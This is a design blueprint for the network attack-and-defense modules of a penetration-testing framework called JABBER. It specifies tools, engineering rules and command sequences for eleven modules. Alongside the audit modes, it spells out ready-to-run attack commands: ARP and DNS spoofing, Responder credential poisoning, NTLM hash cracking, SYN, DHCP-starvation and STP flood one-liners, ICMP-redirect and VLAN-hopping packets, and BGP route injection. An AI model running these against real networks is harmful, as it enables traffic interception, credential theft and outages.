# Network Attack & Defense — Category Blueprint

**Category:** `NETWORK_ATTACK_DEFENSE` | **Slug:** `network` | **Tools Dir:** `~/jabber/jabber-tools/network/`
**Package:** `com.jabber.jabber.modules.network` | **Group:** Access & Penetration

---

## ToolManager: `network/ToolManager.java`

| ID | Binary | Source | Version Check | Install Method |
|----|--------|--------|---------------|----------------|
| `arpspoof` | `arpspoof` | apt (dsniff) | `arpspoof -h` | `apt_install` |
| `ettercap` | `ettercap` | apt | `ettercap --version` | `apt_install` |
| `bettercap` | `bettercap` | `bettercap/bettercap` | `bettercap -eval "quit"` | `github_release` |
| `tcpdump` | `tcpdump` | apt | `tcpdump --version` | `apt_install` |
| `nmap` | `nmap` | apt | `nmap --version` | `apt_install` |
| `hping3` | `hping3` | apt | `hping3 --version` | `apt_install` |
| `macchanger` | `macchanger` | apt | `macchanger -V` | `apt_install` |
| `yersinia` | `yersinia` | apt | `yersinia -V` | `apt_install` |
| `responder` | `Responder.py` | pip/github | `python3 Responder.py --help` | `pip_install` |
| `scapy` | `scapy` | pip | `scapy --version` | `pip_install` |
| `iptables` | `iptables` | apt | `iptables --version` | `apt_install` |
| `dig` | `dig` | apt (dnsutils) | `dig -v` | `apt_install` |
| `whois` | `whois` | apt/pkg | `whois --version` | `apt_install` |

---

## Modules

## Standardized Infrastructure
Every module in this category MUST implement the following self-contained architecture, located in its own dedicated package (e.g., `com.jabber.jabber.modules.<category>.<module_name>/`):

- **`[ModuleName]Module.java`**: The primary controller that defines the `@JABBERModule` metadata, declares the `ModuleInputField` schemas for each execution mode, and handles the orchestration between the UI and the execution engine.
- **`[ModuleName]Engine.java`**: The core execution orchestrator that implements the mandatory 8-step execution doctrine. It manages the high-level logic, tool sequencing, and results aggregation.
- **`ToolManager.java`**: Registry for the 5+ required tools. Handles tool status checks, versioning, and automatic dependency installation via OS-specific package managers (apt, pip, github_release).
- **`InputSanitizer.java`**: Mode-aware validation logic that ensures all inputs (IPs, domains, file paths) are sanitized and conform to security best practices before process execution.
- **`ProcessExecutor.java`**: A thread-safe, low-level process runner that manages `ProcessBuilder` lifecycles, real-time stdout/stderr streaming, and timeout enforcement.
- **`CommandRecord.java`**: A structured data container that captures full telemetry for every command executed (CLI strings, exit codes, durations, and output previews) for the final report.
- **`ReportGenerator.java`**: The findings aggregator that transforms raw tool output and `CommandRecord` data into high-fidelity, structured reports in JSON, Markdown, and HTML formats. It is strictly responsible for capturing, organizing, and physically saving all generated outputs (files, payloads, artifacts) into the reporting structure.

---

## Execution Doctrine (MANDATORY - SURGICAL)

Every module MUST implement the following 8-step execution loop in its `[ModuleName]Engine.java`:

1.  **Validate Mode**: Verify that the selected `ModuleMode` is supported and available.
2.  **Sanitize Schema**: Validate and sanitize all user-provided inputs against the mode-specific schema using `InputSanitizer`.
    - **Failure**: If mandatory input is missing, return `[Input required for execution]`.
3.  **Target Intelligence**: Perform mandatory infrastructure discovery (DNS resolution, WHOIS lookup, server fingerprinting via `dnsx`, `subfinder`, `httpx`).
4.  **Tool Readiness & Verification**: Resolve binary paths via `ToolManager` AND verify the specific tools explicitly selected by the user for this execution.
    - **Failure**: If `selectedTools` list is empty, return `[Must select a tool for execution]`.
5.  **Surgical Command Orchestration**: Build the exact command strings and arguments ONLY for the external tools that were explicitly selected by the user via the frontend toggles.
    - If a tool is not selected, it MUST NOT execute.
    - If one tool is selected, only its command logic runs.
    - If multiple tools are selected, only those tools' commands run sequentially.
6.  **Real-Time Streaming**: Execute selected tools sequentially via `ProcessExecutor` and stream live stdout/stderr logs to the `TaskContext` for UI visibility.
7.  **Findings Extraction**: Parse raw tool output using `ReportGenerator` to identify and extract high-fidelity security findings.
    - **Anti-Pollution**: Findings MUST be flat and professional. Remove CLI strings and durations from executive finding reports.
8.  **Full Telemetry**: Aggregate all telemetry data into the final `ModuleResult` for complete auditability.

---

### Output & Transparency

- **NO Phantom Findings**: If a tool returns no data or an error, no finding is generated. Every result must be verified by real data.
- **Full Traceability**: Every report must include the exact CLI commands executed to ensure transparency and reproducibility.
- **Multi-Format Delivery**: Findings are generated simultaneously in JSON (for automation), HTML (for presentation), and Markdown (for documentation).

---

## Artifact & Output Generation Standard (J. Standard)
Every module in this category MUST physically create and preserve the following outputs:
- **Location**: `reports/artifacts/`, `reports/payloads/`, `reports/outputs/`, or `reports/analysis/` within the module workspace.
- **Naming**: `[Mode]_[Timestamp]_[OriginalName].[Ext]`
- **Hashing**: Mandatory SHA256 hashing for all generated files.
- **Reporting**: All files must be linked and accessible via the final `ReportGenerator` output.

---

## Frontend Requirements

Every module in the **Network Attack & Defense** category MUST implement the following UI components to ensure seamless interaction with the V5 architecture:

1. **Execution Mode Toggle**: Switch between network manipulation and auditing (e.g., `SPOOF` vs `MITM`).
2. **Dynamic Tool Selection Table**: Once an execution mode is selected, render a horizontal table listing all tools associated with that mode. The user must be able to toggle individual tools on/off to directly control execution behavior.
3. **Artifact Integration**: Direct links to the **Artifacts System (Category 21)** for downloading PCAPs, extracted hashes, and intercepted sessions.
4. **Live Packet Graph**: Real-time visual representation of network traffic volume (packets/sec) during floods or interception.
5. **Credential Extraction Panel**: Real-time display of captured NTLM hashes or plaintext credentials from the network stream.

---

---

## Modules

### 1. ARP Spoofing
**ID:** `network-arp-spoof` | **Risk:** HIGH | **File:** `ARPSpoofingModule.java`
**Tools:** `arpspoof`, `bettercap`, `tcpdump`, `nmap`, `macchanger`

#### Execution Modes:

- **`SPOF`** (Short Name: `SPOF`)
    - **Purpose**: Poison the ARP cache of a target to intercept and redirect traffic.
    - **Input Schema**: `{ interface: String, target: String, gateway: String }`
    - **Multi-Tool Command Logic**:
        1. `macchanger -r <interface>` (Identity Obfuscation)
        2. `arpspoof -i <interface> -t <target> <gateway>` (Primary Poisoning)
        3. `nmap -sn <target>` (Liveness Verification)
        4. `tcpdump -i <interface> arp -c 10` (Traffic Verification)
        5. `bettercap -iface <interface> -eval "net.probe on"` (Network Discovery)
    - **Execution Flow**: Obfuscation -> Primary Poisoning -> Liveness -> Traffic Verify -> Discovery.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/SPOOF_[Timestamp]_arp_verify.pcap`: Capture of ARP traffic verifying successful poisoning.
        - `reports/outputs/SPOOF_[Timestamp]_discovery_map.json`: Detailed map of the local network segment.
        - `reports/analysis/SPOOF_[Timestamp]_mac_identity.json`: Log of MAC address changes and obfuscation status.

- **`MITM`** (Short Name: `MITM`)
    - **Purpose**: Full Man-In-The-Middle session with active sniffing and dissection.
    - **Input Schema**: `{ interface: String, targets: String }`
    - **Multi-Tool Command Logic**:
        1. `bettercap -iface <interface> -eval "set arp.spoof.targets <targets>; arp.spoof on; net.sniff on"` (Core MITM)
        2. `tcpdump -i <interface> -w session.pcap` (Raw Capture)
        3. `nmap -p 80,443 <targets>` (Service Audit)
        4. `arpspoof -i <interface> <targets>` (Redundant Poisoning)
        5. `macchanger -s <interface>` (Status Audit)
    - **Execution Flow**: Core MITM -> Raw Capture -> Service Audit -> Redundant Poison -> Status.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/MITM_[Timestamp]_session_capture.pcap`: Raw packet capture of the MITM session.
        - `reports/outputs/MITM_[Timestamp]_sniffed_credentials.json`: Extracted credentials from plaintext protocols.
        - `reports/analysis/MITM_[Timestamp]_service_audit.xml`: Nmap audit of services on the intercepted targets.

---

### 2. DNS Spoofing
**ID:** `network-dns-spoof` | **Risk:** HIGH | **File:** `DNSSpoofingModule.java`
**Tools:** `bettercap`, `ettercap`, `responder`, `tcpdump`, `dig`

#### Execution Modes:

- **`SPOF`** (Short Name: `SPOF`)
    - **Purpose**: Forging DNS replies to redirect users to malicious endpoints.
    - **Input Schema**: `{ interface: String, domain: String, address: String }`
    - **Multi-Tool Command Logic**:
        1. `bettercap -eval "set dns.spoof.domains <domain>; set dns.spoof.address <address>; dns.spoof on"` (Core Spoof)
        2. `dig @127.0.0.1 <domain>` (Local Verification)
        3. `tcpdump -i <interface> udp port 53` (Packet Audit)
        4. `ettercap -T -q -P dns_spoof / /` (Alternative Spoof)
        5. `python3 Responder.py -I <interface> -d` (DNS Support)
    - **Execution Flow**: Core Spoof -> Local Verify -> Packet Audit -> Alternative Spoof -> DNS Support.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/SPOOF_[Timestamp]_dns_audit.pcap`: Packet capture showing forged DNS responses.
        - `reports/outputs/SPOOF_[Timestamp]_spoof_verification.txt`: Log of local and remote DNS resolution checks.
        - `reports/analysis/SPOOF_[Timestamp]_responder_audit.json`: Summary of Responder's DNS support activities.

- **`POIS`** (Short Name: `POIS`)
    - **Purpose**: Local network name resolution poisoning (LLMNR/mDNS).
    - **Input Schema**: `{ interface: String }`
    - **Multi-Tool Command Logic**:
        1. `python3 Responder.py -I <interface> -rdw` (Core Poisoning)
        2. `bettercap -iface <interface> -eval "net.sniff on"` (Traffic Audit)
        3. `tcpdump -i <interface> port 5353 or port 5355` (Protocol Audit)
        4. `dig -x 127.0.0.1` (System Context)
        5. `ettercap -T -q -M arp / /` (Layer 2 Support)
    - **Execution Flow**: Core Poisoning -> Traffic Audit -> Protocol Audit -> System Context -> Layer 2 Support.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/POISON_[Timestamp]_responder_hashes.txt`: Captured LLMNR/mDNS hashes in responder format.
        - `reports/outputs/POISON_[Timestamp]_traffic_audit.json`: Statistical audit of poisoned name resolution traffic.
        - `reports/analysis/POISON_[Timestamp]_protocol_audit.json`: Technical report on LLMNR/mDNS/NBNS protocol activity.

---

### 3. ICMP Redirect
**ID:** `network-icmp-redirect` | **Risk:** MEDIUM | **File:** `ICMPRedirectModule.java`
**Tools:** `hping3`, `scapy`, `tcpdump`, `nmap`, `ip`

#### Execution Modes:

- **`REDR`** (Short Name: `REDR`)
    - **Purpose**: Inject ICMP redirect packets to manipulate remote routing tables.
    - **Input Schema**: `{ target: String, gateway: String, destination: String }`
    - **Multi-Tool Command Logic**:
        1. `hping3 --icmp --icmptype 5 --icmpcode 1 -a <gateway> <target>` (Core Injection)
        2. `tcpdump -i eth0 icmp` (Traffic Verification)
        3. `nmap -sn <target>` (Target Status)
        4. `ip route show` (System Routing Context)
        5. `python3 -c "from scapy.all import *; send(IP(src='<gateway>', dst='<target>')/ICMP(type=5, code=1, gw='<destination>'))"` (Scapy Backup)
    - **Execution Flow**: Core Injection -> Traffic Verify -> Status -> Routing Context -> Scapy Backup.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/REDIR_[Timestamp]_icmp_injection.pcap`: Capture of injected ICMP redirect packets.
        - `reports/outputs/REDIR_[Timestamp]_routing_table.txt`: Target system's routing table (if observable).
        - `reports/analysis/REDIR_[Timestamp]_injection_verification.json`: Technical verification of redirect success.

- **`AUDIT`** (Short Name: `AUDIT`)
    - **Purpose**: Verify if a target system is vulnerable to ICMP redirect attacks.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap --script icmp-redirect-vuln <target>` (Nmap Audit)
        2. `hping3 -1 <target>` (Ping Audit)
        3. `tcpdump -i any icmp -c 5` (Baseline Monitoring)
        4. `ip neigh show` (ARP Context)
        5. `scapy --help` (Version Check)
    - **Execution Flow**: Nmap Audit -> Ping Audit -> Baseline Monitor -> ARP Context -> Version Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_icmp_vulnerability.json`: Nmap results for ICMP redirect vulnerability.
        - `reports/artifacts/AUDIT_[Timestamp]_baseline_icmp.pcap`: Baseline capture of ICMP traffic for the target.
        - `reports/analysis/AUDIT_[Timestamp]_arp_context.json`: Audit of neighboring hosts and ARP infrastructure.

---

### 4. NetBIOS Poisoning
**ID:** `network-netbios-poison` | **Risk:** HIGH | **File:** `NetBIOSPoisoningModule.java`
**Tools:** `responder`, `bettercap`, `nbtscan`, `tcpdump`, `hashcat`

#### Execution Modes:

- **`POIS`** (Short Name: `POIS`)
    - **Purpose**: Capture credentials by poisoning NetBIOS and LLMNR requests.
    - **Input Schema**: `{ interface: String }`
    - **Multi-Tool Command Logic**:
        1. `python3 Responder.py -I <interface> -rdwv` (Core Poisoning)
        2. `nbtscan -r <interface>` (Asset Discovery)
        3. `bettercap -iface <interface> -eval "net.sniff on"` (Sniffing Audit)
        4. `tcpdump -i <interface> port 137 or port 138` (Packet Audit)
        5. `hashcat --help` (Cracker Readiness)
    - **Execution Flow**: Core Poisoning -> Discovery -> Sniffing Audit -> Packet Audit -> Readiness.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/POISON_[Timestamp]_netbios_hashes.txt`: Captured NetBIOS/LLMNR hashes from Responder.
        - `reports/outputs/POISON_[Timestamp]_nbtscan_results.json`: List of identified NetBIOS assets on the network.
        - `reports/analysis/POISON_[Timestamp]_packet_audit.json`: Technical report on NetBIOS/SMB traffic patterns.

- **`RECV`** (Short Name: `RECV`)
    - **Purpose**: Crack captured NTLM hashes from NetBIOS poisoning sessions.
    - **Input Schema**: `{ hash_file: Path, wordlist: Path }`
    - **Multi-Tool Command Logic**:
        1. `hashcat -m 5600 <hash_file> <wordlist>` (Core Crack)
        2. `responder --help` (Dependency Audit)
        3. `nbtscan --version` (Dependency Audit)
        4. `bettercap --version` (Dependency Audit)
        5. `tcpdump --version` (Dependency Audit)
    - **Execution Flow**: Core Crack -> Dependency Audit x4.
    - **Output Generation & Artifacts**:
        - `reports/outputs/RECOVER_[Timestamp]_hashcat_cracked.txt`: Successfully recovered passwords from NTLM hashes.
        - `reports/artifacts/RECOVER_[Timestamp]_hashcat.pot`: Identified passwords stored in hashcat potfile format.
        - `reports/analysis/RECOVER_[Timestamp]_dependency_audit.json`: Status and version audit of all post-exploit dependencies.

---

### 5. SYN Flooder
**ID:** `network-syn-flood` | **Risk:** MEDIUM | **File:** `SynFlooderModule.java`
**Tools:** `hping3`, `scapy`, `nmap`, `tcpdump`, `iptables`

#### Execution Modes:

- **`FLOOD`** (Short Name: `FLOOD`)
    - **Purpose**: Launch a high-velocity SYN flood attack to exhaust target resources.
    - **Input Schema**: `{ target: String, port: int, rate: int }`
    - **Multi-Tool Command Logic**:
        1. `hping3 -S -p <port> -i u<rate> --flood <target>` (Core Flood)
        2. `tcpdump -i any tcp port <port>` (Traffic Audit)
        3. `nmap -p <port> <target>` (Liveness Probe)
        4. `iptables -L -n` (Local Firewall Context)
        5. `python3 -c "from scapy.all import *; send(IP(dst='<target>')/TCP(dport=<port>, flags='S'), loop=1)"` (Scapy Backup)
    - **Execution Flow**: Core Flood -> Traffic Audit -> Liveness -> Firewall Context -> Scapy Backup.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/FLOOD_[Timestamp]_syn_flood_telemetry.pcap`: Capture of high-velocity SYN flood traffic.
        - `reports/outputs/FLOOD_[Timestamp]_target_liveness.json`: Report on target responsiveness during the flood.
        - `reports/analysis/FLOOD_[Timestamp]_firewall_profile.json`: Audit of local and remote firewall rule interactions.

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Stealthy SYN-based port scanning and service profiling.
    - **Input Schema**: `{ target: String, ports: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -sS -p <ports> <target>` (Core Stealth Scan)
        2. `hping3 -S -p 80 -c 5 <target>` (Round-Trip Audit)
        3. `tcpdump -i any host <target> -c 10` (Response Sniffing)
        4. `iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP` (Scan Protection)
        5. `scapy --help` (Library Audit)
    - **Execution Flow**: Stealth Scan -> RTT Audit -> Response Sniffing -> Scan Protection -> Library Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_stealth_results.json`: Nmap stealth SYN scan findings.
        - `reports/artifacts/SCAN_[Timestamp]_rtt_audit.txt`: Round-trip time and latency audit for the target.
        - `reports/analysis/SCAN_[Timestamp]_response_sniffing.json`: Analysis of target TCP stack behavior and responses.

---

### 6. DHCP Starve
**ID:** `network-dhcp-starve` | **Risk:** HIGH | **File:** `DHCPStarveModule.java`
**Tools:** `yersinia`, `scapy`, `tcpdump`, `nmap`, `bettercap`

#### Execution Modes:

- **`STRV`** (Short Name: `STRV`)
    - **Purpose**: Exhaust the DHCP address pool to disrupt network operations.
    - **Input Schema**: `{ interface: String }`
    - **Multi-Tool Command Logic**:
        1. `yersinia dhcp -attack 1 -interface <interface>` (Core Starvation)
        2. `tcpdump -i <interface> port 67 or port 68` (DHCP Traffic Audit)
        3. `bettercap -iface <interface> -eval "net.probe on"` (Network Mapping)
        4. `nmap -sU -p 67 <gateway>` (DHCP Server Probe)
        5. `python3 -c "from scapy.all import *; send(IP(dst='255.255.255.255')/UDP(sport=68, dport=67)/BOOTP(chaddr=RandMAC())/DHCP(options=[('message-type', 'discover'), 'end']), loop=1)"` (Scapy Flood)
    - **Execution Flow**: Core Starvation -> Traffic Audit -> Mapping -> Server Probe -> Scapy Flood.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/STARVE_[Timestamp]_dhcp_flood.pcap`: Capture of DHCP starvation/flood traffic.
        - `reports/outputs/STARVE_[Timestamp]_dhcp_leases.json`: Audit of DHCP lease exhaustion and server responses.
        - `reports/analysis/STARVE_[Timestamp]_network_mapping.json`: Map of the network segment post-starvation.

- **`AUDIT`** (Short Name: `AUDIT`)
    - **Purpose**: Verify DHCP server security and lease configuration.
    - **Input Schema**: `{ interface: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap --script dhcp-discover -e <interface>` (DHCP Discovery)
        2. `tcpdump -i <interface> -vv port 67` (Verbose Sniffing)
        3. `bettercap -iface <interface> -eval "net.sniff on"` (Asset Tracking)
        4. `yersinia dhcp -attack 0 -interface <interface>` (Passive Monitor)
        5. `scapy --help` (Version Consistency)
    - **Execution Flow**: DHCP Discovery -> Verbose Sniffing -> Asset Tracking -> Passive Monitor -> Version Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_dhcp_discover.json`: Results of the Nmap DHCP discovery script.
        - `reports/artifacts/AUDIT_[Timestamp]_dhcp_sniff.pcap`: Verbose capture of DHCP server announcements.
        - `reports/analysis/AUDIT_[Timestamp]_asset_tracking.json`: Tracking log for all identified DHCP-related assets.

---

### 7. BGP Inject
**ID:** `network-bgp-inject` | **Risk:** CRITICAL | **File:** `BGPInjectModule.java`
**Tools:** `scapy`, `tcpdump`, `nmap`, `hping3`, `iptables`

#### Execution Modes:

- **`INJT`** (Short Name: `INJT`)
    - **Purpose**: Inject forged BGP update packets to hijack Internet routing paths.
    - **Input Schema**: `{ target: String, peer_as: int, local_as: int, prefix: String }`
    - **Multi-Tool Command Logic**:
        1. `python3 bgp_injector.py --target <target> --prefix <prefix>` (Core Injection)
        2. `tcpdump -i any port 179` (BGP Traffic Audit)
        3. `nmap -p 179 <target>` (BGP Port Probe)
        4. `hping3 -S -p 179 -c 5 <target>` (TCP Connectivity Check)
        5. `iptables -L -v` (Security Policy Context)
    - **Execution Flow**: Core Injection -> Traffic Audit -> Port Probe -> Connectivity -> Policy Context.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/INJECT_[Timestamp]_bgp_forgery.pcap`: Capture of forged BGP update/keepalive packets.
        - `reports/outputs/INJECT_[Timestamp]_connectivity_audit.json`: Report on TCP connectivity to the BGP peer.
        - `reports/analysis/INJECT_[Timestamp]_security_policy.json`: Audit of firewall and security policies affecting BGP.

- **`AUDIT`** (Short Name: `AUDIT`)
    - **Purpose**: Verify BGP peering stability and security configurations.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 179 --script bgp-info <target>` (BGP Info Audit)
        2. `tcpdump -i any host <target> and port 179` (Peer Sniffing)
        3. `hping3 -S <target>` (Base Connectivity)
        4. `iptables -S` (Firewall Profile)
        5. `scapy --version` (Library Check)
    - **Execution Flow**: BGP Info -> Peer Sniffing -> Base Connectivity -> Firewall Profile -> Library Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_bgp_info.json`: Detailed Nmap audit of BGP peer info and stability.
        - `reports/artifacts/AUDIT_[Timestamp]_bgp_peer_sniff.pcap`: Passive capture of BGP peering traffic.
        - `reports/analysis/AUDIT_[Timestamp]_library_audit.json`: Status and version audit of BGP injection libraries.

---

### 8. BPDU Attack
**ID:** `network-bpdu` | **Risk:** MEDIUM | **File:** `BPDUAttackModule.java`
**Tools:** `yersinia`, `scapy`, `tcpdump`, `nmap`, `bettercap`

#### Execution Modes:

- **`ATTACK`** (Short Name: `ATTACK`)
    - **Purpose**: Manipulate Spanning Tree Protocol to intercept or disrupt bridge traffic.
    - **Input Schema**: `{ interface: String }`
    - **Multi-Tool Command Logic**:
        1. `yersinia stp -attack 1 -interface <interface>` (Core BPDU Flood)
        2. `tcpdump -i <interface> stp` (STP Traffic Audit)
        3. `bettercap -iface <interface> -eval "net.probe on"` (Topology Mapping)
        4. `nmap -sn 192.168.1.0/24` (Network Context)
        5. `python3 -c "from scapy.all import *; send(Dot3(dst='01:80:c2:00:00:00')/LLC()/STP(rootid=0, bridgeid=0, portid=1), loop=1)"` (Scapy BPDU)
    - **Execution Flow**: Core Flood -> Traffic Audit -> Mapping -> Context -> Scapy BPDU.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/ATTACK_[Timestamp]_stp_flood.pcap`: Capture of forged BPDU/STP flood traffic.
        - `reports/outputs/ATTACK_[Timestamp]_topology_changes.json`: Report on network topology shifts and STP convergence.
        - `reports/analysis/ATTACK_[Timestamp]_mapping_audit.json`: Detailed map of the network bridge architecture.

- **`AUDIT`** (Short Name: `AUDIT`)
    - **Purpose**: Verify STP security (Root Guard, BPDU Guard) on switch ports.
    - **Input Schema**: `{ interface: String }`
    - **Multi-Tool Command Logic**:
        1. `tcpdump -i <interface> -vv stp -c 5` (Baseline Audit)
        2. `yersinia stp -attack 0 -interface <interface>` (Passive Monitor)
        3. `bettercap -iface <interface> -eval "net.sniff on"` (Activity Tracking)
        4. `nmap --help` (Version Check)
        5. `scapy --version` (Version Check)
    - **Execution Flow**: Baseline Audit -> Passive Monitor -> Activity Tracking -> Version Check x2.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_stp_baseline.json`: Baseline audit of STP traffic and bridge priority.
        - `reports/artifacts/AUDIT_[Timestamp]_stp_passive.pcap`: Passive capture of STP BPDU packets.
        - `reports/analysis/AUDIT_[Timestamp]_activity_tracking.json`: Continuous tracking of STP activity and port security.

---

### 9. MAC Spoofer
**ID:** `network-mac-spoof` | **Risk:** LOW | **File:** `MacSpooferModule.java`
**Tools:** `macchanger`, `ip`, `ifconfig`, `nmap`, `arp-scan`

#### Execution Modes:

- **`SPOF`** (Short Name: `SPOF`)
    - **Purpose**: Manipulate the physical address of a network interface for anonymity or bypass.
    - **Input Schema**: `{ interface: String, mac: String }`
    - **Multi-Tool Command Logic**:
        1. `macchanger -m <mac> <interface>` (Core Spoof)
        2. `ip link show <interface>` (Verification Audit)
        3. `ifconfig <interface> up` (Interface Reset)
        4. `arp-scan --interface=<interface> --localnet` (Neighbor Discovery)
        5. `nmap -sn 127.0.0.1` (System Integrity Check)
    - **Execution Flow**: Core Spoof -> Verification -> Reset -> Discovery -> Integrity Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SPOOF_[Timestamp]_mac_verification.txt`: Log of MAC address verification and interface status.
        - `reports/artifacts/SPOOF_[Timestamp]_neighbor_discovery.json`: List of identified neighbors on the segment.
        - `reports/analysis/SPOOF_[Timestamp]_integrity_audit.json`: Technical report on interface and system integrity.

- **`RAND`** (Short Name: `RAND`)
    - **Purpose**: Set a random physical address to evade network tracking.
    - **Input Schema**: `{ interface: String }`
    - **Multi-Tool Command Logic**:
        1. `macchanger -r <interface>` (Core Randomization)
        2. `macchanger -s <interface>` (Status Audit)
        3. `ip addr show <interface>` (IP/MAC Consistency)
        4. `nmap --iflist` (Interface Profile)
        5. `arp-scan -l` (Network Re-discovery)
    - **Execution Flow**: Randomization -> Status Audit -> Consistency -> Profile -> Re-discovery.
    - **Output Generation & Artifacts**:
        - `reports/outputs/RANDOM_[Timestamp]_mac_random_log.txt`: History of MAC address randomizations and timestamps.
        - `reports/artifacts/RANDOM_[Timestamp]_discovery_audit.json`: Neighborhood discovery report post-randomization.
        - `reports/analysis/RANDOM_[Timestamp]_interface_profile.json`: Technical profile of the randomized interface.

---

### 10. VLAN Dump
**ID:** `network-vlan-dump` | **Risk:** HIGH | **File:** `VLANDumpModule.java`
**Tools:** `yersinia`, `tcpdump`, `scapy`, `nmap`, `bettercap`

#### Execution Modes:

- **`HOP`** (Short Name: `HOP`)
    - **Purpose**: Exploit trunking misconfigurations to access restricted VLANs.
    - **Input Schema**: `{ interface: String, inner_vlan: int, outer_vlan: int, target: String }`
    - **Multi-Tool Command Logic**:
        1. `yersinia dot1q -attack 1 -interface <interface>` (Core VLAN Hop)
        2. `tcpdump -i <interface> -nn vlan` (VLAN Traffic Audit)
        3. `bettercap -iface <interface> -eval "net.probe on"` (New Segment Mapping)
        4. `nmap -sn <target>` (Cross-VLAN Liveness)
        5. `python3 -c "from scapy.all import *; send(Dot3()/Dot1Q(vlan=<outer_vlan>)/Dot1Q(vlan=<inner_vlan>)/IP(dst='<target>')/ICMP())"` (Scapy Double Tag)
    - **Execution Flow**: Core VLAN Hop -> Traffic Audit -> Mapping -> Liveness -> Scapy Double Tag.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/HOP_[Timestamp]_vlan_tagging.pcap`: Capture showing double-tagged 802.1Q frames.
        - `reports/outputs/HOP_[Timestamp]_cross_vlan_scan.json`: Nmap results for assets identified in the restricted VLAN.
        - `reports/analysis/HOP_[Timestamp]_vlan_audit.json`: Audit of VLAN traffic and trunking misconfigurations.

- **`AUDIT`** (Short Name: `AUDIT`)
    - **Purpose**: Passive discovery of active VLANs and trunking protocols.
    - **Input Schema**: `{ interface: String }`
    - **Multi-Tool Command Logic**:
        1. `tcpdump -i <interface> -nn -e vlan -c 20` (VLAN Discovery)
        2. `bettercap -iface <interface> -eval "net.sniff on"` (Asset Tracking)
        3. `yersinia dot1q -attack 0 -interface <interface>` (Protocol Monitor)
        4. `nmap --help` (Version Consistency)
        5. `scapy --version` (Library Audit)
    - **Execution Flow**: VLAN Discovery -> Asset Tracking -> Protocol Monitor -> Version Consistency -> Library Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vlan_discovery.json`: Catalog of all identified active VLANs on the trunk.
        - `reports/artifacts/AUDIT_[Timestamp]_vlan_traffic.pcap`: Passive capture of VLAN-tagged traffic samples.
        - `reports/analysis/AUDIT_[Timestamp]_protocol_monitor.json`: Technical report on DTP/VTP and trunking protocols.

---

### 11. Packet Sniffer
**ID:** `network-sniffer` | **Risk:** MEDIUM | **File:** `PacketSnifferModule.java`
**Tools:** `tcpdump`, `tshark`, `bettercap`, `nmap`, `scapy`

#### Execution Modes:

- **`SIMP`** (Short Name: `SIMP`)
    - **Purpose**: High-performance capture of raw network traffic for offline analysis.
    - **Input Schema**: `{ interface: String, filter: String }`
    - **Multi-Tool Command Logic**:
        1. `tcpdump -i <interface> -w capture.pcap "<filter>"` (Core Capture)
        2. `tshark -r capture.pcap -c 10` (Capture Summary)
        3. `bettercap -iface <interface> -eval "net.sniff on"` (Live Profile)
        4. `nmap -sn 127.0.0.1` (Self Audit)
        5. `python3 -c "from scapy.all import *; sniff(iface='<interface>', count=5)"` (Scapy Sample)
    - **Execution Flow**: Core Capture -> Summary -> Live Profile -> Self Audit -> Scapy Sample.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/SIMPLE_[Timestamp]_raw_capture.pcap`: Core packet capture file for offline analysis.
        - `reports/outputs/SIMPLE_[Timestamp]_tshark_summary.txt`: Automated summary of protocols and traffic volume.
        - `reports/analysis/SIMPLE_[Timestamp]_live_profile.json`: Bettercap live profiling of the network segment.

- **`DEEP`** (Short Name: `DEEP`)
    - **Purpose**: Real-time protocol dissection and credential/sensitive data extraction.
    - **Input Schema**: `{ interface: String }`
    - **Multi-Tool Command Logic**:
        1. `bettercap -iface <interface> -eval "net.sniff on; set net.sniff.verbose true"` (Core Dissection)
        2. `tshark -i <interface> -Y "http.authbasic or http.cookie" -V` (Credential Extract)
        3. `tcpdump -i <interface> -A -s 0` (ASCII Payload Sniff)
        4. `nmap --iflist` (Routing Context)
        5. `python3 -c "from scapy.all import *; sniff(iface='<interface>', prn=lambda x: x.summary())"` (Logic Sample)
    - **Execution Flow**: Core Dissection -> Credential Extract -> Payload Sniff -> Routing Context -> Logic Sample.
    - **Output Generation & Artifacts**:
        - `reports/outputs/DEEP_[Timestamp]_extracted_creds.json`: Credentials and sensitive tokens extracted via dissection.
        - `reports/artifacts/DEEP_[Timestamp]_ascii_payloads.txt`: Captured ASCII/Hex payloads from unencrypted traffic.
        - `reports/analysis/DEEP_[Timestamp]_logic_audit.json`: Scapy-based logic analysis of custom protocols.

---

**© 2026 Funbinet Inc. — JABBER V 5.5.0.0**

---
